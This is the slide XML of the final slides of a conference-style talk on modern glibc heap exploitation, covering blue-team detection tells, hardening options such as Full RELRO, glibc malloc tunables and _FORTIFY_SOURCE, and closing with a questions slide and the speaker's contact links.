          <p:cNvPr id="411" name="Google Shape;411;p25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="1737360"/>
            <a:ext cx="3931920" cy="2926080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1563"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="1874520"/>
            <a:ext cx="3931920" cy="1554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5484D"/>
              </a:buClr>
              <a:buSzPts val="12000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="12000">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:endParaRPr sz="12000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="413" name="Google Shape;413;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7955280" y="3520440"/>
            <a:ext cx="356616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6E8EB"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>classic primitive → control</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E6E8EB"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>techniques are DEAD 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E6E8EB"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>current glibc</a:t>
            </a:r>
            <a:endParaRPr sz="16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418" name="Shape 418"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419" name="Google Shape;419;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="310896"/>
            <a:ext cx="10058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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CASE №2039 — DEFENSE</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="420" name="Google Shape;420;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10515600" y="6382512"/>
            <a:ext cx="12344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9B"/>
              </a:buClr>
              <a:buSzPts val="900"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>26 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="421" name="Google Shape;421;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="603504"/>
            <a:ext cx="111556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E8EB"/>
              </a:buClr>
              <a:buSzPts val="3400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="3400">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>For the blue team</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="422" name="Google Shape;422;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1600200"/>
            <a:ext cx="6858000" cy="457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B341"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Detection: each step has a tell — wild frees, tcache count anomalies, RIP into libc mid-frame.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">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600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Full RELRO — kills GOT overwrite, makes hijack targets scarcer.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">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600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>GLIBC_TUNABLES=glibc.malloc.check=3 and tcache tunables for defense-in-depth.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>_FORTIFY_SOURCE + modern compiler to catch the overflow upstream.</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="423" name="Google Shape;423;p26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="1737360"/>
            <a:ext cx="3931920" cy="2011680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2273"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6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7955280" y="1965960"/>
            <a:ext cx="3566160" cy="1554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2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="1" lang="en-US" sz="2200">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>"The hooks are gone"</a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="1" lang="en-US" sz="2200">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>is not</a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="1" lang="en-US" sz="2200">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>"the heap is safe."</a:t>
            </a:r>
            <a:endParaRPr sz="2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317"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="429" name="Shape 429"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430" name="Google Shape;430;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="54864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341"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CASE №2039 — CLOSED</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="431" name="Google Shape;431;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="518153" y="1851675"/>
            <a:ext cx="60228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8EB"/>
              </a:buClr>
              <a:buSzPts val="7200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="7200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Questions?</a:t>
            </a:r>
            <a:endParaRPr sz="7200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="432" name="Google Shape;432;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502923" y="3383275"/>
            <a:ext cx="6617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1600"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>github.com/Parshva87/debugging-modern-glibc-heap</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="433" name="Google Shape;433;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="4160520"/>
            <a:ext cx="8229600" cy="7315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6E8EB"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Parshwa Bhojak</a:t>
            </a:r>
            <a:endParaRPr sz="15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29B"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Security Automation Engineer  ·  Driven Tech</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="434" name="Google Shape;434;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="507492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3FB950"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>github.com/Parshva87</a:t>
            </a:r>
            <a:endParaRPr sz="13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29B"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>linkedin.com/in/parshwa-bhojak-0b1a95153</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="435" name="Google Shape;435;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="621792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9B"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Credits: how2heap / Shellphish · glibc source (bminor)</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="436" name="Google Shape;436;p27"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7914025" y="2148735"/>
            <a:ext cx="3931800" cy="2011800"/>
            <a:chOff x="7914025" y="2148735"/>
            <a:chExt cx="3931800" cy="2011800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="437" name="Google Shape;437;p27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7914025" y="2148735"/>
              <a:ext cx="3931800" cy="2011800"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst>
                <a:gd fmla="val 2273" name="adj"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="1E222A"/>
            </a:solidFill>
            <a:ln cap="flat" cmpd="sng" w="12700">
              <a:solidFill>
                <a:srgbClr val="343A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7"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8032505" y="2377335"/>
              <a:ext cx="3566100" cy="1554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3B341"/>
                </a:buClr>
                <a:buSzPts val="2200"/>
                <a:buFont typeface="Arial"/>
                <a:buNone/>
              </a:pPr>
              <a:r>
                <a:rPr b="1" i="1" lang="en-US" sz="3300">
                  <a:solidFill>
                    <a:srgbClr val="E3B341"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                  <a:ea typeface="Arial"/>
                  <a:cs typeface="Arial"/>
                  <a:sym typeface="Arial"/>
                </a:rPr>
                <a:t>"</a:t>
              </a:r>
              <a:r>
                <a:rPr b="1" i="1" lang="en-US" sz="3300">
                  <a:solidFill>
                    <a:srgbClr val="E3B341"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Heaps don't lie</a:t>
              </a:r>
              <a:r>
                <a:rPr b="1" i="1" lang="en-US" sz="3300">
                  <a:solidFill>
                    <a:srgbClr val="E3B341"/>
                  </a:solidFill>
                  <a:latin typeface="Arial"/>
                  <a:ea typeface="Arial"/>
                  <a:cs typeface="Arial"/>
                  <a:sym typeface="Arial"/>
                </a:rPr>
                <a:t>"</a:t>
              </a:r>
              <a:endParaRPr sz="33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2026-09-13T02:50:44Z</dcterms:created>
  <dc:creator>PptxGenJS</dc:creator>
</cp:coreProperties>
</file>